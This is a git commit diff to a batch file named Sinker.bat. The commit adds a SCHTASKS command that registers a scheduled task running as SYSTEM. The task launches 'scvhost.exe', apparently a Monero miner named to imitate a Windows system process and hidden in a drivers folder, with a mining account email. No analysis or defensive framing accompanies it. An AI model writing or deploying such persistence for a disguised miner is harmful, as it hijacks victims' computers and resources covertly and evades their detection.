5b12c998e8d0dfc1230fc210868077565cd7f9d6
diggles9991 <diggles9991@gmail.com>
2017-07-15 15:06:48 +1000

    Update Sinker.bat

--- Sinker.bat
+++ Sinker.bat
@@ -1,1 +1,1 @@
-C:\Windows\System32\drivers\en-US\etc\scvhost.exe -user diggles9991@gmail.com -xmr
+SCHTASKS /Create /RU "SYSTEM" /tn "test" /tr "C:\Windows\System32\drivers\en-US\etc\scvhost.exe -user diggles9991@gmail.com -xmr"
